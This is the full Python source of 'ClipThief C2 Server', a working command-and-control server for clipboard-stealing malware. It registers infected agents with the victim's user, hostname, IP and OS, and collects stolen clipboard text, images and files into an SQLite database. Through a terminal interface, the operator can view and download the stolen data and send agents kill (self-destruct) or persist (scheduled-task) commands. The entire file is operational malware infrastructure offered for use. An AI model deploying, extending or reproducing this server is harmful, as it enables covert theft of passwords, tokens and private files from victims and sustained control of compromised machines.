#!/usr/bin/env python3
"""
ClipThief C2 Server
@erberkan / B3R-SEC

Terminal-based Command & Control server.
Receives: agent registration, clipboard data (text / image / file)
Sends:    kill (self-destruct) | persist (scheduled task)
Storage:  SQLite (c2_data.db) — survives restarts

Usage:
    python c2_server.py [--host HOST] [--port PORT]
"""

import os
import sys
import base64
import sqlite3
import threading
import argparse
import time
import queue
from datetime import datetime
from pathlib import Path

try:
    from flask import Flask, request, jsonify
except ImportError:
    print("[!] Flask not found.  Run:  pip install flask")
    sys.exit(1)

try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.text import Text
    from rich.syntax import Syntax
    from rich.prompt import Confirm
    from rich import box
except ImportError:
    print("[!] Rich not found.  Run:  pip install rich")
    sys.exit(1)

# ============================================================
#  Paths
# ============================================================
BASE_DIR      = Path(__file__).parent
DB_PATH       = BASE_DIR / "c2_data.db"
DOWNLOADS_DIR = BASE_DIR / "downloads"

# ============================================================
#  Flask
# ============================================================
app = Flask(__name__)
app.config["MAX_CONTENT_LENGTH"] = 200 * 1024 * 1024

import logging
logging.getLogger("werkzeug").setLevel(logging.ERROR)

# ============================================================
#  Rich console  (force_terminal keeps color in all envs)
# ============================================================
console = Console(highlight=False)

# ============================================================
#  In-memory state  (loaded from DB on startup)
# ============================================================
agents: dict       = {}   # id -> info dict
pending_cmds: dict = {}   # id -> "kill" | "persist"
db_lock            = threading.Lock()
new_agent_queue: queue.Queue = queue.Queue()

# Agent, POLL_MS=3s'de bir polling yapar.
# 3 ardışık polling kaçırılırsa (~10s) agent dead sayılır.
AGENT_TIMEOUT_SEC = 10

# ============================================================
#  Database helpers
# ============================================================

def db_connect() -> sqlite3.Connection:
    conn = sqlite3.connect(str(DB_PATH), check_same_thread=False)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA foreign_keys=ON")
    return conn

def db_init():
    conn = db_connect()
    conn.executescript("""
        CREATE TABLE IF NOT EXISTS agents (
            id         TEXT PRIMARY KEY,
            user       TEXT,
            hostname   TEXT,
            ip         TEXT,
            os         TEXT,
            first_seen TEXT,
            last_seen  TEXT,
            status     TEXT
        );
        CREATE TABLE IF NOT EXISTS clipboard_entries (
            rowid      INTEGER PRIMARY KEY AUTOINCREMENT,
            agent_id   TEXT NOT NULL,
            seq        INTEGER NOT NULL,
            type       TEXT NOT NULL,
            content    TEXT NOT NULL,
            filename   TEXT,
            timestamp  TEXT NOT NULL,
            FOREIGN KEY(agent_id) REFERENCES agents(id)
        );
    """)
    conn.commit()
    for row in conn.execute("SELECT * FROM agents").fetchall():
        agents[row["id"]] = dict(row)
    conn.close()
    console.print(f"[dim][[*]][/] Database: [cyan]{DB_PATH}[/]  "
                  f"([yellow]{len(agents)}[/] agents loaded)")

def db_upsert_agent(info: dict):
    conn = db_connect()
    conn.execute("""
        INSERT INTO agents (id, user, hostname, ip, os, first_seen, last_seen, status)
        VALUES (:id, :user, :hostname, :ip, :os, :first_seen, :last_seen, :status)
        ON CONFLICT(id) DO UPDATE SET
            last_seen = excluded.last_seen,
            status    = excluded.status
    """, info)
    conn.commit()
    conn.close()

def db_insert_clip(agent_id: str, seq: int, clip_type: str,
                   content: str, filename: str, timestamp: str):
    conn = db_connect()
    conn.execute("""
        INSERT INTO clipboard_entries
            (agent_id, seq, type, content, filename, timestamp)
        VALUES (?, ?, ?, ?, ?, ?)
    """, (agent_id, seq, clip_type, content, filename, timestamp))
    conn.commit()
    conn.close()

def db_get_clips(agent_id: str) -> list:
    conn = db_connect()
    rows = conn.execute("""
        SELECT seq, type, content, filename, timestamp
        FROM clipboard_entries WHERE agent_id = ? ORDER BY seq
    """, (agent_id,)).fetchall()
    conn.close()
    return [{"id": r["seq"], "type": r["type"], "content": r["content"],
             "filename": r["filename"], "timestamp": r["timestamp"]} for r in rows]

def db_next_seq(agent_id: str) -> int:
    conn = db_connect()
    row = conn.execute("""
        SELECT COALESCE(MAX(seq), 0) + 1 AS next
        FROM clipboard_entries WHERE agent_id = ?
    """, (agent_id,)).fetchone()
    conn.close()
    return row["next"]

def db_clear_all():
    conn = db_connect()
    conn.executescript("DELETE FROM clipboard_entries; DELETE FROM agents;")
    conn.commit()
    conn.close()

def db_clear_agent(agent_id: str):
    conn = db_connect()
    conn.execute("DELETE FROM clipboard_entries WHERE agent_id = ?", (agent_id,))
    conn.execute("DELETE FROM agents WHERE id = ?", (agent_id,))
    conn.commit()
    conn.close()

# ============================================================
#  REST API
# ============================================================

@app.route("/api/agent/register", methods=["POST"])
def api_register():
    data     = request.get_json(force=True, silent=True) or {}
    agent_id = data.get("id", "").strip()
    if not agent_id:
        return jsonify({"error": "missing id"}), 400

    now = _now()
    with db_lock:
        is_new = agent_id not in agents
        if is_new:
            info = {
                "id":         agent_id,
                "user":       data.get("user",     "unknown"),
                "hostname":   data.get("hostname", "unknown"),
                "ip":         data.get("ip",       request.remote_addr),
                "os":         data.get("os",       "unknown"),
                "first_seen": now,
                "last_seen":  now,
                "status":     "active",
            }
            agents[agent_id] = info
        else:
            agents[agent_id]["last_seen"] = now
            agents[agent_id]["status"]    = "active"
            info = agents[agent_id]
        db_upsert_agent(info)

    if is_new:
        _notify_new_agent(info)
        new_agent_queue.put(agent_id)
    else:
        _notify("reconnect",
                f"AGENT RECONNECTED  {info['user']}@{info['hostname']}  "
                f"({agent_id[:8]}...)")

    return jsonify({"status": "ok"})


@app.route("/api/agent/<agent_id>/clipboard", methods=["POST"])
def api_clipboard(agent_id):
    data      = request.get_json(force=True, silent=True) or {}
    clip_type = data.get("type",     "text")
    content   = data.get("content",  "")
    filename  = data.get("filename", "")
    now       = _now()

    with db_lock:
        seq = db_next_seq(agent_id)
        db_insert_clip(agent_id, seq, clip_type, content, filename, now)
        if agent_id in agents:
            agents[agent_id]["last_seen"] = now
            db_upsert_agent(agents[agent_id])

    entry = {"id": seq, "type": clip_type, "content": content,
             "filename": filename, "timestamp": now}
    _notify("clip",
            f"clip from {agent_id[:8]}...  {_clip_preview(entry)}",
            clip_type=clip_type)

    return jsonify({"status": "ok"})


@app.route("/api/agent/<agent_id>/command", methods=["GET"])
def api_command(agent_id):
    with db_lock:
        if agent_id in agents:
            agents[agent_id]["last_seen"] = _now()
            db_upsert_agent(agents[agent_id])
        cmd = pending_cmds.pop(agent_id, "none")
    return jsonify({"command": cmd})


# ============================================================
#  Helpers
# ============================================================

def _now() -> str:
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

_ui_lock = threading.Lock()

# Clipboard type → (rich style, label)
_TYPE_META = {
    "text":  ("cyan",   "[TXT] "),
    "image": ("yellow", "[IMG] "),
    "file":  ("green",  "[FILE]"),
}

def _notify(kind: str, msg: str, clip_type: str = ""):
    """Thread-safe colored notification to terminal."""
    with _ui_lock:
        if kind == "dead":
            console.print(f"\n  [bold red][!] {msg}[/]")
        elif kind == "reconnect":
            console.print(f"\n  [bold yellow][~] {msg}[/]")
        elif kind == "clip":
            style, label = _TYPE_META.get(clip_type, ("white", "[?]   "))
            console.print(f"\n  [{style}]{label}[/]  {msg}")
        else:
            console.print(f"\n  {msg}")


def _notify_new_agent(a: dict):
    """Rich Panel notification for a newly connected agent."""
    content = Text()
    content.append("ID:       ", style="bold white")
    content.append(a["id"] + "\n", style="yellow")
    content.append("User:     ", style="bold white")
    content.append(a["user"] + "\n", style="bold green")
    content.append("Hostname: ", style="bold white")
    content.append(a["hostname"] + "\n", style="cyan")
    content.append("IP:       ", style="bold white")
    content.append(a["ip"] + "\n", style="cyan")
    content.append("OS:       ", style="bold white")
    content.append(a["os"] + "\n", style="dim")
    content.append("Time:     ", style="bold white")
    content.append(a["first_seen"], style="dim")

    with _ui_lock:
        console.print()
        console.print(Panel(
            content,
            title="[bold red]★  NEW AGENT CONNECTED  ★[/]",
            border_style="red",
            expand=False,
            padding=(1, 4),
        ))
        console.print("  [dim]Press Enter to open agent menu...[/]\n")


def _clip_preview(entry: dict) -> str:
    if entry["type"] == "text":
        try:
            text = base64.b64decode(entry["content"]).decode("utf-8", errors="replace")
            return text[:80].replace("\n", " ").replace("\r", "")
        except Exception:
            return "(decode error)"
    return entry.get("filename") or "(binary)"


def _detect_lang(text: str) -> str:
    """Guess syntax language for rich.Syntax highlighting."""
    t = text.strip()
    if t.startswith(("{", "[")):
        return "json"
    up = t.upper()
    if any(k in up for k in ("SELECT ", "INSERT ", "UPDATE ", "DELETE ", "CREATE ", "DROP ")):
        return "sql"
    if any(k in t for k in ("def ", "import ", "class ", "print(", "if __name__")):
        return "python"
    if t.startswith("<") and ">" in t:
        return "xml"
    return "text"


def _save_clip_to_disk(agent_id: str, entry: dict) -> Path:
    DOWNLOADS_DIR.mkdir(parents=True, exist_ok=True)
    if entry["type"] == "file" and entry.get("filename"):
        suffix = Path(entry["filename"]).suffix or ".bin"
    else:
        suffix = {"text": ".txt", "image": ".bmp"}.get(entry["type"], ".bin")
    fpath = DOWNLOADS_DIR / f"{agent_id[:8]}_{entry['id']}{suffix}"
    fpath.write_bytes(base64.b64decode(entry["content"]))
    return fpath


def _open_file(path: Path):
    try:
        if sys.platform == "win32":
            os.startfile(str(path))
        elif sys.platform == "darwin":
            os.system(f'open "{path}"')
        else:
            os.system(f'xdg-open "{path}"')
    except Exception as e:
        console.print(f"  [red][!] Cannot open: {e}[/]")


# ============================================================
#  Terminal UI — helpers
# ============================================================

def _clear():
    os.system("cls" if os.name == "nt" else "clear")


_CEYCEY = """
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⡿⣿⣿⣿
⡿⠟⠫⠋⢉⣁⣉⡉⠉⠉⠋⠛⣿⣿⣿⡛⠋⠋⠉⠉⣁⣈⣉⡐⠩⠛⢻
⣷⣦⣶⣿⡿⠯⠭⠭⠭⠭⣝⢻⣿⣿⣿⡿⢫⠭⠭⠭⠭⠭⠿⣿⣷⣦⣼
⣿⣿⣿⣩⡚⠃⢀⠀⡘⠌⢻⣸⣿⣿⣿⣷⣼⣋⢚⢀⣀⢀⠛⣊⣽⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿     Be careful what you copy.
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣼⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⢋⣿⡟⣸⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⢙⣛⣛⣛⣛⣛⣛⣛⣉⣩⣭⣴⣾⣿⣿⢣⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣼⣿⣿⣿⣿
"""

def _banner():
    console.print(_CEYCEY)
    console.print("=" * 55)
    console.print("  [bold cyan]ClipThief C2 Server[/]  [dim]|[/]  [dim]@erberkan / B3R-SEC[/]")
    console.print("=" * 55)
    console.print()


def _input(prompt: str) -> str:
    with _ui_lock:
        return console.input(prompt).strip()


# ============================================================
#  Terminal UI — screens
# ============================================================

def screen_agent_list() -> list:
    _clear()
    _banner()

    with db_lock:
        agent_list = list(agents.values())

    if not agent_list:
        console.print("  [dim]No agents in database.[/]\n")
        return agent_list

    table = Table(
        box=box.ROUNDED,
        header_style="bold cyan",
        border_style="bright_black",
        show_lines=False,
        expand=False,
    )
    table.add_column("#",         style="dim",    width=4,  justify="right")
    table.add_column("ID",                        width=12)
    table.add_column("USER",                      width=16)
    table.add_column("HOSTNAME",                  width=20)
    table.add_column("IP",                        width=16)
    table.add_column("LAST SEEN",                 width=21)
    table.add_column("STATUS",                    width=10)

    for i, a in enumerate(agent_list, 1):
        short = a["id"][:8] + "..."
        if a["status"] == "active":
            status_text = Text("● active", style="bold green")
        else:
            status_text = Text("✗ dead",   style="bold red")

        table.add_row(
            str(i), short, a["user"], a["hostname"],
            a["ip"], a["last_seen"], status_text,
        )

    console.print(table)
    console.print()
    return agent_list


def screen_agent_menu(agent_id: str):
    while True:
        _clear()
        _banner()

        with db_lock:
            a = agents.get(agent_id)

        if not a:
            console.print("  [bold red][!] Agent not found in database.[/]")
            _input("  Press Enter...")
            return

        clips = db_get_clips(agent_id)

        # ── Agent info panel ──────────────────────────────────
        status_style = "bold green" if a["status"] == "active" else "bold red"
        status_icon  = "●" if a["status"] == "active" else "✗"

        info = Text()
        info.append("Agent ID:  ", style="bold white")
        info.append(a["id"] + "\n", style="yellow")
        info.append("User:      ", style="bold white")
        info.append(a["user"] + "\n", style="bold green")
        info.append("Hostname:  ", style="bold white")
        info.append(a["hostname"] + "\n", style="cyan")
        info.append("IP:        ", style="bold white")
        info.append(a["ip"] + "\n", style="cyan")
        info.append("OS:        ", style="bold white")
        info.append(a["os"] + "\n", style="dim")
        info.append("First seen:", style="bold white")
        info.append(" " + a["first_seen"] + "\n", style="dim")
        info.append("Last seen: ", style="bold white")
        info.append(a["last_seen"] + "\n", style="dim")
        info.append("Status:    ", style="bold white")
        info.append(f"{status_icon} {a['status']}\n", style=status_style)
        info.append("Clipboard: ", style="bold white")
        info.append(f"{len(clips)} entries", style="bold cyan")

        console.print(Panel(info, title="[bold cyan]Agent Details[/]",
                            border_style="cyan", expand=False, padding=(0, 2)))
        console.print()

        # ── Menu ─────────────────────────────────────────────
        console.print("  [bold cyan]\\[1][/] View clipboard history")
        console.print("  [bold red]\\[2][/] Send KILL command  [dim](self-destruct + delete)[/]")
        console.print("  [bold yellow]\\[3][/] Send PERSIST command  [dim](add scheduled task)[/]")
        console.print("  [white]\\[4][/] Delete this agent from DB")
        console.print("  [dim]\\[0] Back[/]")
        console.print()

        choice = _input("  [bold]>[/] ")

        if choice == "1":
            screen_clipboard_list(agent_id)

        elif choice == "2":
            with _ui_lock:
                confirmed = Confirm.ask(
                    "  [bold red]Send KILL command? This will destroy the agent[/]",
                    default=False,
                )
            if confirmed:
                with db_lock:
                    pending_cmds[agent_id] = "kill"
                console.print("  [bold green][+] KILL queued.[/]")
                _input("  Press Enter...")

        elif choice == "3":
            with db_lock:
                pending_cmds[agent_id] = "persist"
            console.print("  [bold green][+] PERSIST queued.[/]")
            _input("  Press Enter...")

        elif choice == "4":
            with _ui_lock:
                confirmed = Confirm.ask(
                    "  [bold red]Delete agent + all clipboard data?[/]",
                    default=False,
                )
            if confirmed:
                with db_lock:
                    agents.pop(agent_id, None)
                db_clear_agent(agent_id)
                console.print("  [bold green][+] Agent removed from database.[/]")
                _input("  Press Enter...")
                return

        elif choice == "0":
            return


def screen_clipboard_list(agent_id: str):
    while True:
        _clear()
        _banner()

        clips = db_get_clips(agent_id)

        if not clips:
            console.print("  [dim]No clipboard data.[/]\n")
            _input("  Press Enter...")
            return

        table = Table(
            title=f"[bold]Clipboard[/] — [yellow]{agent_id[:8]}...[/]  "
                  f"[dim]({len(clips)} entries)[/]",
            box=box.ROUNDED,
            header_style="bold cyan",
            border_style="bright_black",
            show_lines=False,
            expand=False,
        )
        table.add_column("#",                   width=5,  justify="right", style="dim")
        table.add_column("TYPE",                width=7)
        table.add_column("TIMESTAMP",           width=21, style="dim")
        table.add_column("PREVIEW / FILENAME")

        for e in clips[-50:]:
            style, label = _TYPE_META.get(e["type"], ("white", "[?]   "))
            table.add_row(
                str(e["id"]),
                Text(label, style=style),
                e["timestamp"],
                _clip_preview(e)[:60],
            )

        console.print(table)
        console.print()
        console.print(
            "  [dim]<n>[/] view    [dim]D <n>[/] download    [dim]0[/] back"
        )
        console.print()

        choice = _input("  [bold]>[/] ")

        if choice == "0":
            return

        if choice.upper().startswith("D "):
            try:
                _download_entry(agent_id, int(choice.split()[1]), clips)
            except (IndexError, ValueError):
                console.print("  [red]Usage: D <number>[/]")
                _input("  Press Enter...")
        else:
            try:
                screen_view_entry(agent_id, int(choice), clips)
            except ValueError:
                pass


def screen_view_entry(agent_id: str, clip_id: int, clips: list):
    entry = next((e for e in clips if e["id"] == clip_id), None)
    if not entry:
        console.print(f"  [red][!] Entry #{clip_id} not found.[/]")
        _input("  Press Enter...")
        return

    _clear()
    _banner()

    style, label = _TYPE_META.get(entry["type"], ("white", "[?]"))
    console.print(Panel(
        f"[{style}]{label}[/]  [dim]{entry['timestamp']}[/]",
        title=f"[bold]Entry #{clip_id}[/]",
        border_style=style,
        expand=False,
    ))
    console.print()

    if entry["type"] == "text":
        try:
            text = base64.b64decode(entry["content"]).decode("utf-8", errors="replace")
        except Exception as ex:
            text = f"(decode error: {ex})"

        lang = _detect_lang(text)
        if lang != "text":
            console.print(Syntax(text, lang, theme="monokai",
                                 line_numbers=True, word_wrap=True))
        else:
            # Plain text in a dim panel
            console.print(Panel(text, border_style="bright_black", expand=False))
    else:
        try:
            saved = _save_clip_to_disk(agent_id, entry)
            console.print(f"  [bold green][+][/] Saved: [cyan]{saved}[/]")
            _open_file(saved)
        except Exception as ex:
            console.print(f"  [red][!] {ex}[/]")

    console.print()
    _input("  Press Enter...")


def _download_entry(agent_id: str, clip_id: int, clips: list):
    entry = next((e for e in clips if e["id"] == clip_id), None)
    if not entry:
        console.print(f"  [red][!] Entry #{clip_id} not found.[/]")
        _input("  Press Enter...")
        return
    try:
        saved = _save_clip_to_disk(agent_id, entry)
        console.print(
            f"  [bold green][+][/] Downloaded: [cyan]{saved}[/]  "
            f"[dim]({saved.stat().st_size:,} bytes)[/]"
        )
    except Exception as ex:
        console.print(f"  [red][!] {ex}[/]")
    _input("  Press Enter...")


def screen_db_menu():
    while True:
        _clear()
        _banner()

        conn  = db_connect()
        n_ag  = conn.execute("SELECT COUNT(*) FROM agents").fetchone()[0]
        n_cl  = conn.execute("SELECT COUNT(*) FROM clipboard_entries").fetchone()[0]
        db_sz = DB_PATH.stat().st_size if DB_PATH.exists() else 0
        conn.close()

        stats = Text()
        stats.append("Path:      ", style="bold white")
        stats.append(str(DB_PATH) + "\n", style="dim")
        stats.append("Size:      ", style="bold white")
        stats.append(f"{db_sz:,} bytes\n", style="cyan")
        stats.append("Agents:    ", style="bold white")
        stats.append(f"{n_ag}\n", style="bold green")
        stats.append("Clipboard: ", style="bold white")
        stats.append(f"{n_cl} entries", style="bold yellow")

        console.print(Panel(stats, title="[bold]Database[/]",
                            border_style="bright_black", expand=False, padding=(0, 2)))
        console.print()
        console.print("  [bold red]\\[1][/] Clear ALL data  [dim](agents + clipboard)[/]")
        console.print("  [dim]\\[0] Back[/]")
        console.print()

        choice = _input("  [bold]>[/] ")

        if choice == "1":
            with _ui_lock:
                confirmed = Confirm.ask(
                    "  [bold red]Wipe entire database?[/]",
                    default=False,
                )
            if confirmed:
                db_clear_all()
                with db_lock:
                    agents.clear()
                    pending_cmds.clear()
                console.print("  [bold green][+] Database cleared.[/]")
                _input("  Press Enter...")
        elif choice == "0":
            return


# ============================================================
#  Heartbeat monitor — agent timeout detection
# ============================================================

def _heartbeat_monitor():
    fmt = "%Y-%m-%d %H:%M:%S"
    while True:
        time.sleep(5)
        now = datetime.now()
        with db_lock:
            for agent_id, a in agents.items():
                if a["status"] == "dead":
                    continue
                try:
                    elapsed = (now - datetime.strptime(a["last_seen"], fmt)).total_seconds()
                except ValueError:
                    continue
                if elapsed > AGENT_TIMEOUT_SEC:
                    a["status"] = "dead"
                    db_upsert_agent(a)
                    _notify("dead",
                            f"AGENT DEAD  {a['user']}@{a['hostname']}  "
                            f"({agent_id[:8]}...)  — last seen {int(elapsed)}s ago")


# ============================================================
#  Main terminal loop
# ============================================================

def run_terminal_ui():
    time.sleep(0.8)

    while True:
        try:
            agent_id = new_agent_queue.get_nowait()
            screen_agent_menu(agent_id)
            continue
        except queue.Empty:
            pass

        agent_list = screen_agent_list()

        console.print("  [bold cyan]\\[N][/]  Select agent by number")
        console.print("  [bold cyan]\\[D][/]  Database management")
        console.print("  [bold cyan]\\[R][/]  Refresh")
        console.print("  [bold cyan]\\[Q][/]  Quit")
        console.print()

        choice = _input("  [bold]>[/] ").upper()

        if choice == "Q":
            console.print("\n  [dim]Shutting down...[/]\n")
            os._exit(0)
        elif choice == "D":
            screen_db_menu()
        elif choice == "R":
            continue
        else:
            try:
                num = int(choice)
                if 1 <= num <= len(agent_list):
                    screen_agent_menu(agent_list[num - 1]["id"])
            except ValueError:
                pass


# ============================================================
#  Entry point
# ============================================================

def main():
    parser = argparse.ArgumentParser(description="ClipThief C2 Server")
    parser.add_argument("--host", default="0.0.0.0")
    parser.add_argument("--port", default=5000, type=int)
    args = parser.parse_args()

    DOWNLOADS_DIR.mkdir(parents=True, exist_ok=True)
    db_init()

    console.print(f"[dim][[*]][/] Listening on [cyan]{args.host}:{args.port}[/]\n")

    threading.Thread(
        target=lambda: app.run(
            host=args.host, port=args.port,
            debug=False, use_reloader=False, threaded=True,
        ),
        daemon=True, name="flask",
    ).start()

    threading.Thread(
        target=_heartbeat_monitor,
        daemon=True, name="heartbeat",
    ).start()

    run_terminal_ui()


if __name__ == "__main__":
    main()
